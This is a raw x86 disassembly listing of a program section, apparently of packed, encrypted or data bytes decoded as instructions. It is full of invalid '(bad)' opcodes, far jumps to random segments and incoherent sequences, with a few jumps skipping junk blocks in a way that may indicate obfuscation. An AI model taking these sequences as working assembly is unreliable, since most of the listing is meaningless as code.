  40f225:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f226:	cld    
  40f227:	mov    ds:0x5cedb993,eax
  40f22c:	xchg   edi,eax
  40f22d:	pop    edx
  40f22e:	(bad)
  40f231:	mov    dl,0x51
  40f233:	sub    ebx,eax
  40f235:	or     ecx,eax
  40f237:	dec    ebx
  40f238:	xchg   ebp,eax
  40f239:	xor    ch,BYTE PTR [esi-0x22]
  40f23c:	pop    ecx
  40f23d:	sbb    eax,0x259e9443
  40f242:	sbb    DWORD PTR ds:0xe739360,edx
  40f248:	lods   al,BYTE PTR ds:[esi]
  40f249:	std    
  40f24a:	xchg   edi,eax
  40f24b:	nop
  40f24c:	add    edx,ebp
  40f24e:	es int3 
  40f250:	ds xchg ecx,ecx
  40f253:	ins    BYTE PTR es:[edi],dx
  40f254:	or     edx,DWORD PTR [ecx+0x6393a931]
  40f25a:	and    al,0xad
  40f25c:	cdq    
  40f25d:	dec    esp
  40f25e:	or     cl,BYTE PTR [eax]
  40f260:	arpl   WORD PTR [edx-0x6e],si
  40f263:	mulps  xmm1,XMMWORD PTR [eax+0x6808303]
  40f26a:	and    DWORD PTR [esi],0x48a654ab
  40f270:	lds    esp,FWORD PTR [edi+0x1f]
  40f273:	or     al,0x58
  40f275:	mov    ?,WORD PTR [ebp+0x0]
  40f278:	pop    es
  40f279:	push   0xbc9b591e
  40f27e:	mov    esp,0x836a45af
  40f283:	inc    eax
  40f284:	add    DWORD PTR [ebx+0x4b],esi
  40f287:	bswap  ebx
  40f289:	mov    edi,0xe3c6dc6
  40f28e:	pushf  
  40f28f:	or     BYTE PTR [edx-0x5f5ac87d],cl
  40f295:	call   0x69f7:0xd9ec1571
  40f29c:	js     0x40f28d
  40f29e:	jb     0x40f2e7
  40f2a0:	imul   ebp,DWORD PTR [ecx+0xd684c3e],0x57b61a49
  40f2aa:	fst    DWORD PTR [ebx+0x3a]
  40f2ad:	jmp    0xc3de6a70
  40f2b2:	dec    edx
  40f2b3:	ss fs addr16 xor eax,0x975628e
  40f2bb:	pop    ebx
  40f2bc:	fisub  WORD PTR [edi-0x52f02e94]
  40f2c2:	mov    ebp,0xf1713190
  40f2c7:	xchg   esp,eax
  40f2c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f2c9:	cmp    al,0xd2
  40f2cb:	mov    ebp,0x1582d2cf
  40f2d0:	push   0x12f2e034
  40f2d5:	popa   
  40f2d6:	push   edx
  40f2d7:	dec    esi
  40f2d8:	ret    0x62ed
  40f2db:	fs mov ebp,0xe9493f2d
  40f2e1:	pop    ss
  40f2e2:	push   esp
  40f2e3:	mov    cl,0x39
  40f2e5:	fwait
  40f2e6:	ins    BYTE PTR es:[edi],dx
  40f2e7:	pop    edi
  40f2e8:	xchg   ecx,eax
  40f2e9:	and    BYTE PTR [eax-0x3f],dl
  40f2ec:	in     eax,dx
  40f2ed:	pop    ds
  40f2ee:	je     0x40f2e9
  40f2f0:	lods   al,BYTE PTR gs:[esi]
  40f2f2:	aas    
  40f2f3:	sbb    ch,BYTE PTR [ebp-0x5]
  40f2f6:	push   edx
  40f2f7:	test   BYTE PTR [eax],dh
  40f2f9:	ja     0x40f2e9
  40f2fb:	fbstp  TBYTE PTR [ebx-0x6446fa3d]
  40f301:	sbb    BYTE PTR [edi-0x42eb6b3],dh
  40f307:	sub    BYTE PTR [esi-0x375b2869],cl
  40f30d:	daa    
  40f30e:	xor    eax,0xcd724908
  40f313:	xor    BYTE PTR [eax-0x1c],bh
  40f316:	sub    al,0x2
  40f318:	adc    BYTE PTR [ecx+ecx*8-0x69],al
  40f31c:	add    edi,DWORD PTR [edx-0x804cbfd]
  40f322:	dec    ebp
  40f323:	sbb    ecx,DWORD PTR [esi]
  40f325:	cs inc edi
  40f327:	push   edi
  40f328:	aam    0x52
  40f32a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f32b:	xchg   ebx,eax
  40f32c:	and    al,0xe1
  40f32e:	fwait
  40f32f:	daa    
  40f330:	daa    
  40f331:	fs aas 
  40f333:	sbb    eax,0xffafa96f
  40f338:	xchg   esi,eax
  40f339:	call   0x8e06:0x6a688e86
  40f340:	jmp    0x3fd8:0x768ffed0
  40f347:	das    
  40f348:	inc    eax
  40f349:	jne    0x40f365
  40f34b:	fprem1 
  40f34d:	in     al,0xef
  40f34f:	pop    edx
  40f350:	dec    edi
  40f351:	jmp    0xa4b4:0x362993af
  40f358:	push   eax
  40f359:	jge    0x40f2fd
  40f35b:	ja     0x40f300
  40f35d:	das    
  40f35e:	or     bl,BYTE PTR [ecx]
  40f360:	push   edx
  40f361:	cdq    
  40f362:	sahf   
  40f363:	(bad)  
  40f364:	ror    DWORD PTR [edx-0x3f],1
  40f367:	inc    ebp
  40f368:	rcr    ah,cl
  40f36a:	sbb    cl,BYTE PTR [esi]
  40f36c:	lock cmp BYTE PTR [eax+0x63],0x2a
  40f371:	mov    ch,0x6f
  40f373:	sbb    bl,BYTE PTR [edi-0x7c8051cf]
  40f379:	fistp  WORD PTR [esi-0x1c639fda]
  40f37f:	call   0x59bdd4dc
  40f384:	xchg   ebp,eax
  40f385:	sti    
  40f386:	scas   al,BYTE PTR es:[edi]
  40f387:	fisub  WORD PTR [edx-0x34e8b9d4]
  40f38d:	fld    TBYTE PTR [edx-0x64d999b5]
  40f393:	pop    edi
  40f394:	pop    ecx
  40f395:	mov    ds:0x171a9a55,al
  40f39a:	xchg   ecx,eax
  40f39b:	jno    0x40f3c4
  40f39d:	jb     0x40f37b
  40f39f:	mov    DWORD PTR [esi],esi
  40f3a1:	push   ecx
  40f3a2:	div    BYTE PTR [eax+ebp*1-0x6cac305b]
  40f3a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f3aa:	jbe    0x40f3d1
  40f3ac:	pusha  
  40f3ad:	inc    ecx
  40f3ae:	cmp    esp,esp
  40f3b0:	jns    0x40f33e
  40f3b2:	pop    ebp
  40f3b3:	cmp    al,BYTE PTR [ebx-0x638ef460]
  40f3b9:	std    
  40f3ba:	loop   0x40f34a
  40f3bc:	and    bl,ch
  40f3be:	pop    edi
  40f3bf:	sahf   
  40f3c0:	es push esp
  40f3c2:	mov    bh,0x90
  40f3c4:	adc    edx,DWORD PTR [esi-0x56]
  40f3c7:	popf   
  40f3c8:	pop    eax
  40f3c9:	or     BYTE PTR cs:[ebx+0x5b],dl
  40f3cd:	arpl   WORD PTR [ebx-0x116fb8c8],di
  40f3d3:	inc    edi
  40f3d4:	jg     0x40f3de
  40f3d6:	(bad)  
  40f3d7:	lahf   
  40f3d8:	add    ecx,DWORD PTR [eax]
  40f3da:	inc    esp
  40f3db:	retf   0x392e
  40f3de:	out    dx,eax
  40f3df:	xor    eax,0x8e0e5069
  40f3e4:	test   DWORD PTR [ebx-0x47521064],eax
  40f3ea:	fisubr DWORD PTR [eax-0x1346813b]
  40f3f0:	js     0x40f386
  40f3f2:	pop    eax
  40f3f3:	mov    ecx,0xe54578f4
  40f3f8:	pop    esi
  40f3f9:	add    eax,ebx
  40f3fb:	pop    ebx
  40f3fc:	leave  
  40f3fd:	ret    0x8
  40f400:	push   ebp
  40f401:	mov    ebp,esp
  40f403:	push   ecx
  40f404:	mov    DWORD PTR ds:0x433727,0x6a14
  40f40e:	push   ecx
  40f40f:	xor    ecx,edx
  40f411:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  40f418:	jmp    0x40f6e7
  40f41d:	call   0xa1f0:0x6df6cd0b
  40f424:	push   ebx
  40f425:	inc    ebx
  40f426:	push   edi
  40f427:	dec    ecx
  40f428:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f429:	fucomp st(7)
  40f42b:	jno    0x40f47e
  40f42d:	scas   eax,DWORD PTR es:[edi]
  40f42e:	stos   DWORD PTR es:[edi],eax
  40f42f:	jle    0x40f4af
  40f431:	lods   al,BYTE PTR ds:[esi]
  40f432:	jl     0x40f4b2
  40f434:	jle    0x40f3e0
  40f436:	out    dx,al
  40f437:	sar    edi,cl
  40f439:	dec    edi
  40f43a:	dec    ecx
  40f43b:	or     DWORD PTR [esp+ebx*8],ebx
  40f43e:	pop    edi
  40f43f:	lods   eax,DWORD PTR ds:[esi]
  40f440:	push   ds
  40f441:	sub    esp,ebp
  40f443:	jo     0x40f3f4
  40f445:	cmp    DWORD PTR [ecx-0x5],ebp
  40f448:	and    dh,BYTE PTR [esi-0x28]
  40f44b:	pop    eax
  40f44c:	adc    ebx,edi
  40f44e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f44f:	fmul   DWORD PTR [ebx]
  40f451:	out    0x1c,eax
  40f453:	cmp    DWORD PTR [ecx],0xffffff81
  40f456:	shl    BYTE PTR [ebx+0x47],cl
  40f459:	out    dx,eax
  40f45a:	inc    esp
  40f45b:	std    
  40f45c:	pushf  
  40f45d:	mov    bh,0x8b
  40f45f:	jb     0x40f42b
  40f461:	out    0x3d,eax
  40f463:	ror    DWORD PTR [ebx],1
  40f465:	stos   BYTE PTR es:[edi],al
  40f466:	inc    eax
  40f467:	pop    eax
  40f468:	jmp    0x1695:0x7b1b7ae6
  40f46f:	rol    BYTE PTR [esi+0x10],0x9d
  40f473:	inc    esp
  40f474:	cdq    
  40f475:	sbb    dl,BYTE PTR [edx]
  40f477:	or     eax,0x5a7eb0ef
  40f47c:	pop    ebx
  40f47d:	fld    QWORD PTR [ebx-0x19f36f20]
  40f483:	mov    ecx,0x1a0f9ed3
  40f488:	mov    ebp,0xf86868ba
  40f48d:	(bad)  
  40f48e:	retf   0xe133
  40f491:	mov    dl,0x8c
  40f493:	test   DWORD PTR [edx],eax
  40f495:	mov    ecx,0x87671c2f
  40f49a:	push   esp
  40f49b:	lahf   
  40f49c:	dec    ebp
  40f49d:	(bad)  
  40f49e:	pop    ecx
  40f49f:	mov    ecx,0x4758426e
  40f4a4:	js     0x40f509
  40f4a6:	ss pop ss
  40f4a8:	xchg   ebp,eax
  40f4a9:	shl    DWORD PTR [esi+edi*4+0x135423e3],cl
  40f4b0:	stos   DWORD PTR es:[edi],eax
  40f4b1:	les    ebp,FWORD PTR [edx+0x5f404a3a]
  40f4b7:	inc    edx
  40f4b8:	mov    ecx,0x8a84c2cb
  40f4bd:	xchg   edx,eax
  40f4be:	lock adc eax,0xf7481263
  40f4c4:	pusha  
  40f4c5:	das    
  40f4c6:	mov    bh,0x2a
  40f4c8:	out    0x6c,al
  40f4ca:	xchg   BYTE PTR [esi],bl
  40f4cc:	pop    edi
  40f4cd:	ja     0x40f4d3
  40f4cf:	pop    ebp
  40f4d0:	stos   BYTE PTR es:[edi],al
  40f4d1:	cmp    al,0xa1
  40f4d3:	dec    ebp
  40f4d4:	mov    edi,0x8ba240d0
  40f4d9:	mov    cl,0x3a
  40f4db:	jge    0x40f496
  40f4dd:	retf   
  40f4de:	and    edi,DWORD PTR [edi-0x1079bffb]
  40f4e4:	out    0x3a,eax
  40f4e6:	cmp    esp,DWORD PTR [ebp-0x3d]
  40f4e9:	int    0x93
  40f4eb:	fmul   QWORD PTR [ecx+0x52b0bad0]
  40f4f1:	scas   al,BYTE PTR es:[edi]
  40f4f2:	aad    0x7e
  40f4f4:	adc    edi,DWORD PTR [edi]
  40f4f6:	xor    al,BYTE PTR [eax+0x3b3e5ed2]
  40f4fc:	mov    al,ds:0xe247e5cc
  40f501:	std    
  40f502:	pop    edi
  40f503:	call   0xcb5da27b
  40f508:	inc    ebp
  40f509:	test   edx,edi
  40f50b:	cmp    ah,BYTE PTR [edx-0x10]
  40f50e:	inc    esi
  40f50f:	fild   WORD PTR [edi-0x44]
  40f512:	enter  0x431d,0xc6
  40f516:	les    esi,FWORD PTR [ebx+0xc]
  40f519:	in     eax,0xd5
  40f51b:	mov    ebx,0x6c477929
  40f520:	(bad)  
  40f522:	scas   eax,DWORD PTR es:[edi]
  40f523:	push   cs
  40f524:	fmul   st(5),st
  40f526:	add    eax,0xdf507f4
  40f52b:	push   0x66
  40f52d:	and    eax,DWORD PTR [ebx-0xd]
  40f530:	push   es
  40f531:	mov    bl,dl
  40f533:	imul   esp,eax,0x839bdcdf
  40f539:	inc    ebp
  40f53a:	pop    ecx
  40f53b:	pop    ss
  40f53c:	lods   eax,DWORD PTR ds:[esi]
  40f53d:	sbb    BYTE PTR [ebx],al
  40f53f:	sti    
  40f540:	jnp    0x40f538
  40f542:	adc    DWORD PTR ds:0x3e9be489,ecx
  40f548:	nop
  40f549:	ret    0xb2f2
  40f54c:	fs (bad) 
  40f54e:	mov    dl,0x1
  40f550:	in     eax,0x13
  40f552:	jo     0x40f5b1
  40f554:	sbb    al,BYTE PTR [edx-0x3fa52e39]
  40f55a:	cmp    edi,DWORD PTR [ecx]
  40f55c:	dec    edi
  40f55d:	mov    cl,al
  40f55f:	jnp    0x40f510
  40f561:	mov    ds,WORD PTR [eax-0x63b36404]
  40f567:	in     eax,dx
  40f568:	pop    esi
  40f569:	outs   dx,DWORD PTR ds:[esi]
  40f56a:	nop
  40f56b:	pop    edi
  40f56c:	adc    esp,DWORD PTR [esi]
  40f56e:	dec    ebx
  40f56f:	loop   0x40f53c
  40f571:	rol    BYTE PTR [ebp+0x6b],0xed
  40f575:	inc    edx
  40f576:	imul   ebp,DWORD PTR [edi-0x75757415],0x25
  40f57d:	call   0x9c0e2bf7
  40f582:	cmp    al,0xd0
  40f584:	int3   
  40f585:	push   0x42
  40f587:	aas    
  40f588:	ss pop edi
  40f58a:	jmp    0xf31f51f1
  40f58f:	das    
  40f590:	sbb    DWORD PTR ds:0xa93b636f,ebx
  40f596:	aas    
  40f597:	mov    ah,0x4b
  40f599:	(bad)  
  40f59a:	in     al,dx
  40f59b:	and    dl,ah
  40f59d:	les    edx,FWORD PTR [edx]
  40f59f:	test   DWORD PTR [ecx-0x12],esp
  40f5a2:	addr16 jnp 0x40f5e2
  40f5a5:	test   BYTE PTR [ebp-0x56],ah
  40f5a8:	(bad)  
  40f5aa:	dec    edi
  40f5ab:	mov    ah,0xa0
  40f5ad:	push   ebx
  40f5ae:	xchg   edi,eax
  40f5af:	pop    edi
  40f5b0:	call   0x4a3b21a2
  40f5b5:	shl    DWORD PTR [esi+0x4cd53cbf],cl
  40f5bb:	mov    dl,0xe8
  40f5bd:	pop    ebp
  40f5be:	std    
  40f5bf:	inc    eax
  40f5c0:	lahf   
  40f5c1:	shl    BYTE PTR [ebp+0x602f6bb5],1
  40f5c7:	xchg   edi,eax
  40f5c8:	lock sbb al,0x5e
  40f5cb:	cmp    edi,edi
  40f5cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f5ce:	pop    ebp
  40f5cf:	cmp    DWORD PTR [esi+0x6f31fb42],esp
  40f5d5:	adc    ecx,DWORD PTR [ebx-0x57]
  40f5d8:	add    eax,0x72f8a8ef
  40f5dd:	jg     0x40f5ea
  40f5df:	push   ds
  40f5e0:	aam    0x4d
  40f5e2:	sbb    eax,0x8e8a83bc
  40f5e7:	inc    edx
  40f5e8:	fiadd  WORD PTR [edi-0x6f]
  40f5eb:	iret   
  40f5ec:	jb     0x40f57c
  40f5ee:	xor    DWORD PTR [ebp-0x70],0x32
  40f5f2:	inc    eax
  40f5f3:	in     al,0x0
  40f5f5:	test   eax,0x44057070
  40f5fa:	cmp    bl,ah
  40f5fc:	fstp   TBYTE PTR [edx]
  40f5fe:	fist   DWORD PTR [esi+0x65bc62df]
  40f604:	push   edx
  40f605:	jle    0x40f602
  40f607:	xchg   ebp,eax
  40f608:	sub    bh,BYTE PTR [eax]
  40f60a:	retf   0xe833
  40f60d:	dec    esi
  40f60e:	mul    dh
  40f610:	call   DWORD PTR [esi]
  40f612:	adc    al,0x8d
  40f614:	cld    
  40f615:	outs   dx,DWORD PTR ds:[esi]
  40f616:	cmp    eax,0xaefd6c20
  40f61b:	(bad)  
  40f61c:	fsub   st(7),st
  40f61e:	outs   dx,DWORD PTR ds:[esi]
  40f61f:	cmp    al,0x22
  40f621:	ja     0x40f602
  40f623:	fsubr  QWORD PTR [ebx]
  40f625:	neg    BYTE PTR [edx+eiz*2-0x7e]
  40f629:	gs aad 0x5d
  40f62c:	fnstenv [edx-0x2c]
  40f62f:	cmc    
  40f630:	pop    ebp
  40f631:	mov    dh,0x23
  40f633:	int    0xd7
  40f635:	jmp    0xb1dc:0xe4b9a356
  40f63c:	cmp    al,0xa2
  40f63e:	clc    
  40f63f:	fs mov ch,0x5d
  40f642:	subps  xmm1,XMMWORD PTR [edi+0x66]
  40f646:	cmp    bl,BYTE PTR [esi]
  40f648:	sbb    DWORD PTR [ebx],ecx
  40f64a:	sbb    BYTE PTR [ebp+0x3d],cl
  40f64d:	out    dx,eax
  40f64e:	mov    bh,0x21
  40f650:	mov    DWORD PTR [ebp-0x2e7b2404],ebp
  40f656:	mov    ecx,0x395750d2
  40f65b:	shl    DWORD PTR [edi],cl
  40f65d:	test   eax,0x534f3c15
  40f662:	inc    esi
  40f663:	sti    
  40f664:	push   ds
  40f665:	xor    dh,BYTE PTR [ebx]
  40f667:	add    ebx,ebx
  40f669:	fbstp  TBYTE PTR [ebx-0x2d7e4c93]
  40f66f:	push   esi
  40f670:	cmp    edi,DWORD PTR [ecx]
  40f672:	into   
  40f673:	push   edi
  40f674:	sbb    eax,0x4b03664e
  40f679:	mov    esp,DWORD PTR [esi]
  40f67b:	jb     0x40f6df
  40f67d:	mov    dl,0x39
  40f67f:	retf   
  40f680:	jecxz  0x40f621
  40f682:	mov    cl,0x4e
  40f684:	push   ss
  40f685:	aas    
  40f686:	mov    dl,0x5f
  40f688:	pop    esp
  40f689:	mov    edx,0xff6b9f81
  40f68e:	inc    esi
  40f68f:	mov    dh,dh
  40f691:	push   cs
  40f692:	scas   eax,DWORD PTR es:[edi]
  40f693:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f694:	outs   dx,BYTE PTR ds:[esi]
  40f695:	enter  0x7d63,0x2d
  40f699:	inc    esi
  40f69a:	cdq    
  40f69b:	inc    edi
  40f69c:	xor    al,0xca
  40f69e:	test   BYTE PTR [edi],bh
  40f6a0:	(bad)  
  40f6a1:	movaps XMMWORD PTR [esi+0x9df68b6],xmm2
  40f6a8:	int    0x74
  40f6aa:	xor    eax,0xae0caf4a
  40f6af:	xor    dl,BYTE PTR [bp+di-0x28bb]
  40f6b4:	mov    ebp,0x4aae3116
  40f6b9:	ret    
  40f6ba:	mov    esp,0xf0841c62
  40f6bf:	leave  
  40f6c0:	mov    bl,BYTE PTR [ebx+0x6f932f2d]
  40f6c6:	mov    dh,0x6e
  40f6c8:	clc    
  40f6c9:	mov    esp,0xbf1504e3
  40f6ce:	mov    edx,0x49d46c66
  40f6d3:	and    al,0xd4
  40f6d5:	test   BYTE PTR [edi+0x1e736dc],0xca
  40f6dc:	ret    
  40f6dd:	jl     0x40f6d1
  40f6df:	pop    ecx
  40f6e0:	mov    esp,0xdf32a632
  40f6e5:	jmp    0x8532:0xfc45c77f
  40f6ec:	pushf  
  40f6ed:	clc    
  40f6ee:	sub    DWORD PTR ds:0x433727,0x5c72
  40f6f8:	mov    eax,DWORD PTR [ebp-0x4]
  40f6fb:	add    DWORD PTR ds:0x4336e7,0x767c
  40f705:	jmp    0x40f9d4
  40f70a:	ins    BYTE PTR es:[edi],dx
  40f70b:	xchg   BYTE PTR [eax+0x70d870dc],ah
  40f711:	xchg   esi,eax
  40f712:	in     eax,0xdf
  40f714:	or     eax,ebp
  40f716:	mov    bl,0x64
  40f718:	cmp    edx,DWORD PTR [ebx-0x23]
  40f71b:	mov    dh,0x7e
  40f71d:	jle    0x40f6cb
  40f71f:	jl     0x40f79f
  40f721:	jle    0x40f781
  40f723:	pop    ds
  40f724:	jo     0x40f735
  40f726:	shl    ah,0x6c
  40f729:	cmc    
  40f72a:	fild   WORD PTR [edi]
  40f72c:	mov    ebx,0x21781cd3
  40f731:	popf   
  40f732:	imul   DWORD PTR [ecx+ecx*2]
  40f735:	jg     0x40f71a
  40f737:	cmp    BYTE PTR [ecx+0x77cdca4f],0x68
  40f73e:	or     BYTE PTR [ecx+0x57739774],ah
  40f744:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f745:	fadd   st,st(2)
  40f747:	call   0x5568:0x4d09e88e
  40f74e:	loop   0x40f6e0
  40f750:	popa   
  40f751:	mov    al,0xfb
  40f753:	jae    0x40f783
  40f755:	retf   0xf657
  40f758:	xor    BYTE PTR [edx],dl
  40f75a:	pop    edi
  40f75b:	or     eax,0x2ad367cb
  40f760:	pop    edi
  40f761:	mov    eax,0x5aad27ec
  40f766:	test   eax,0x9599170c
  40f76b:	stc    
  40f76c:	or     BYTE PTR [edx],bl
  40f76e:	adc    ecx,DWORD PTR [esi]
  40f770:	pop    ecx
  40f771:	lahf   
  40f772:	cmp    ah,0x90
  40f775:	inc    edx
  40f776:	fucomip st,st(5)
  40f778:	pop    edx
  40f779:	push   eax
  40f77a:	inc    edi
  40f77b:	or     DWORD PTR [edx+eax*8-0x38a89623],ebx
  40f782:	adc    esp,edi
  40f784:	push   ebp
  40f785:	outs   dx,DWORD PTR ds:[esi]
  40f786:	shl    DWORD PTR [ebp+0x76],0x41
  40f78a:	lods   al,BYTE PTR ds:[esi]
  40f78b:	or     BYTE PTR [esi],0xec
  40f78e:	dec    esi
  40f78f:	in     eax,0x1d
  40f791:	push   edx
  40f792:	push   ds
  40f793:	xor    BYTE PTR [esi],cl
  40f795:	xor    eax,0xf3ed92f8
  40f79a:	enter  0x38fa,0xdf
  40f79e:	sub    al,0x5
  40f7a0:	lahf   
  40f7a1:	and    bl,BYTE PTR [esi*2-0x6bff9c7]
  40f7a8:	add    al,0xd2
  40f7aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7ab:	sahf   
  40f7ac:	dec    esp
  40f7ad:	aad    0x5b
  40f7af:	outs   dx,DWORD PTR ds:[esi]
  40f7b0:	fild   WORD PTR [ecx-0x6cb884df]
  40f7b6:	lock lahf 
  40f7b8:	inc    esi
  40f7b9:	jo     0x40f73d
  40f7bb:	adc    DWORD PTR [ebx-0x12866a79],ecx
  40f7c1:	xchg   edi,eax
  40f7c2:	cld    
  40f7c3:	data16 mov bh,0x7c
  40f7c6:	sub    bh,BYTE PTR ds:0xe0eb255e
  40f7cc:	xchg   esp,eax
  40f7cd:	and    edi,DWORD PTR [ecx+0x506e202]
  40f7d3:	pop    ds
  40f7d4:	(bad)  [ebx-0x36]
  40f7d7:	rcl    DWORD PTR [edx+0xb],cl
  40f7da:	xchg   edi,eax
  40f7db:	loope  0x40f83b
  40f7dd:	rcl    BYTE PTR [eax+0x282165ae],0x6
  40f7e4:	retf   
  40f7e5:	sbb    BYTE PTR [ebp+0x1c],dh
  40f7e8:	sub    al,0x8e
  40f7ea:	xchg   esp,eax
  40f7eb:	out    0xd7,al
  40f7ed:	test   eax,0x57f40315
  40f7f2:	mov    ch,0xbc
  40f7f4:	mov    cs,WORD PTR [ecx]
  40f7f6:	mov    dl,cl
  40f7f8:	dec    esi
  40f7f9:	in     al,dx
  40f7fa:	xchg   ebx,eax
  40f7fb:	add    eax,0x7a007a4a
  40f800:	inc    ebx
  40f801:	test   al,0xe4
  40f803:	and    eax,0x18ce1128
  40f808:	push   ds
  40f809:	or     bh,bl
  40f80b:	inc    ecx
  40f80c:	popf   
  40f80d:	(bad)  
  40f80e:	aad    0x57
  40f810:	(bad)
  40f814:	push   es
  40f815:	repz sub bl,al
  40f818:	fcom   QWORD PTR [esi]
  40f81a:	imul   esp,esp,0x5d
  40f81d:	scas   eax,DWORD PTR es:[edi]
  40f81e:	xchg   esp,eax
  40f81f:	sbb    al,0x6f
  40f821:	js     0x40f827
  40f823:	jge    0x40f85d
  40f825:	fistp  DWORD PTR [eax-0xf]
  40f828:	outs   dx,BYTE PTR ds:[esi]
  40f829:	loopne 0x40f7c9
  40f82b:	pop    ebp
  40f82c:	lods   al,BYTE PTR ds:[esi]
  40f82d:	xor    ebp,DWORD PTR [ebp+0x776b4c55]
  40f833:	in     eax,dx
  40f834:	sbb    DWORD PTR [eax+0x12],ebx
  40f837:	dec    esp
  40f838:	jnp    0x40f7da
  40f83a:	xchg   ecx,eax
  40f83b:	mov    edx,0xb490dd19
  40f840:	ror    BYTE PTR [ebp+0x21],cl
  40f843:	cmp    esp,DWORD PTR ds:0x1d1a9abc
  40f849:	dec    eax
  40f84a:	js     0x40f80e
  40f84c:	js     0x40f851
  40f84e:	pop    ebx
  40f84f:	into   
  40f850:	out    0xed,eax
  40f852:	push   ss
  40f853:	adc    DWORD PTR [ecx-0xe633544],esp
  40f859:	adc    BYTE PTR ds:0x80a5f829,al
  40f85f:	rcr    ebp,0x4e
  40f862:	fmul   QWORD PTR [ebx]
  40f864:	inc    ax
  40f866:	int3   
  40f867:	test   eax,0x35965a28
  40f86c:	test   eax,0x5c034969
  40f871:	sbb    eax,0xb38dc390
  40f876:	jb     0x40f808
  40f878:	mov    bh,0x90
  40f87a:	xchg   ebx,eax
  40f87b:	call   0x71c7a0cc
  40f880:	mov    bh,0x58
  40f882:	pop    DWORD PTR [ebp-0x61449275]
  40f888:	retf   0x6b61
  40f88b:	lahf   
  40f88c:	sbb    BYTE PTR [esi-0x650d2369],bh
  40f892:	shl    DWORD PTR [esi],cl
  40f894:	popf   
  40f895:	xchg   esp,eax
  40f896:	dec    edi
  40f897:	test   DWORD PTR [edi+ebx*4+0x63eba96],eax
  40f89e:	or     BYTE PTR [esi],0x4c
  40f8a1:	push   ss
  40f8a2:	or     DWORD PTR [edx-0xb6a09fd],0xffffff96
  40f8a9:	push   es
  40f8aa:	gs rcl ebp,cl
  40f8ad:	or     BYTE PTR [ebp-0x7fa1f450],al
  40f8b3:	(bad)  
  40f8b4:	fadd   QWORD PTR [ebx]
  40f8b6:	pop    ss
  40f8b7:	daa    
  40f8b8:	shr    BYTE PTR [edi+0x7f],1
  40f8bb:	add    ah,BYTE PTR [ebx+eax*4+0x48]
  40f8bf:	in     al,dx
  40f8c0:	inc    edi
  40f8c1:	add    DWORD PTR [edx],esi
  40f8c3:	es pop edx
  40f8c5:	fcom   QWORD PTR [esi]
  40f8c7:	jl     0x40f874
  40f8c9:	loop   0x40f8a6
  40f8cb:	jmp    0x42c9:0x7ba462bd
  40f8d2:	adc    BYTE PTR [edx],0x3d
  40f8d5:	cwde   
  40f8d6:	jo     0x40f8ab
  40f8d8:	jae    0x40f8d7
  40f8da:	addr16 xor al,0x10
  40f8dd:	pop    edi
  40f8de:	jne    0x40f957
  40f8e0:	mov    esi,0x387c86b5
  40f8e5:	sahf   
  40f8e6:	dec    esi
  40f8e7:	aaa    
  40f8e8:	push   esp
  40f8e9:	jp     0x40f87c
  40f8eb:	loopne 0x40f8d8
  40f8ed:	pop    ebp
  40f8ee:	mov    ebp,0x824e655f
  40f8f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8f4:	cmp    eax,0xa79e04dd
  40f8f9:	inc    ebp
  40f8fa:	mov    eax,0x73debc08
  40f8ff:	clc    
  40f900:	shl    DWORD PTR [esi-0x3c],1
  40f903:	scas   al,BYTE PTR es:[edi]
  40f904:	test   al,0xc9
  40f906:	sbb    ecx,DWORD PTR [ebx+0x1d]
  40f909:	and    al,0xe0
  40f90b:	mov    ebx,0x216d662e
  40f910:	sub    al,0xf5
  40f912:	fwait
  40f913:	mov    ds:0x8a109588,eax
  40f918:	pop    ecx
  40f919:	add    al,0xf1
  40f91b:	jbe    0x40f960
  40f91d:	aad    0x2c
  40f91f:	sub    BYTE PTR [eax],ah
  40f921:	mov    ds:0xc021b7a6,al
  40f926:	push   ebx
  40f927:	rcr    BYTE PTR [ebp-0x1a],1
  40f92a:	arpl   WORD PTR [ebp+0x144f23d7],sp
  40f930:	xchg   esi,eax
  40f931:	retf   
  40f932:	or     DWORD PTR cs:[ecx],ebp
  40f935:	test   edx,esi
  40f937:	inc    esi
  40f938:	push   edx
  40f939:	cmp    eax,0x94201e65
  40f93e:	(bad)  
  40f940:	(bad)  
  40f941:	(bad)  
  40f942:	jmp    0x40f95a
  40f944:	inc    edx
  40f945:	ss cld 
  40f947:	(bad)  
  40f948:	scas   al,BYTE PTR es:[edi]
  40f949:	enter  0xa665,0xcc
  40f94d:	enter  0x72c8,0x2b
  40f951:	mov    eax,0xfe50c29f
  40f956:	bound  ebp,QWORD PTR [edi+0x7b340601]
  40f95c:	out    0x6b,eax
  40f95e:	in     eax,0xcc
  40f960:	xchg   BYTE PTR [edi-0x6d],bl
  40f963:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f964:	cwde   
  40f965:	mov    ebp,0x21ad75ad
  40f96a:	lods   al,BYTE PTR ds:[esi]
  40f96b:	jg     0x40f9ad
  40f96d:	retf   
  40f96e:	xchg   esi,eax
  40f96f:	jg     0x40f96f
  40f971:	push   edx
  40f972:	nop
  40f973:	ins    DWORD PTR es:[edi],dx
  40f974:	jp     0x40f99b
  40f976:	sbb    bl,BYTE PTR gs:[ecx]
  40f979:	jmp    0xef1b89b2
  40f97e:	inc    edx
  40f97f:	mov    bl,BYTE PTR [ecx+0x24]
  40f982:	sub    ah,bl
  40f984:	stos   BYTE PTR es:[edi],al
  40f985:	test   al,0x4d
  40f987:	retf   0x71ce
  40f98a:	int    0x3b
  40f98c:	scas   al,BYTE PTR es:[edi]
  40f98d:	sbb    BYTE PTR ds:0xcee029d5,0xc1
  40f994:	cld    
  40f995:	stos   DWORD PTR es:[edi],eax
  40f996:	bound  esi,QWORD PTR [esi]
  40f998:	scas   eax,DWORD PTR es:[edi]
  40f999:	or     eax,0x478d0f2c
  40f99e:	inc    edx
  40f99f:	xchg   edx,eax
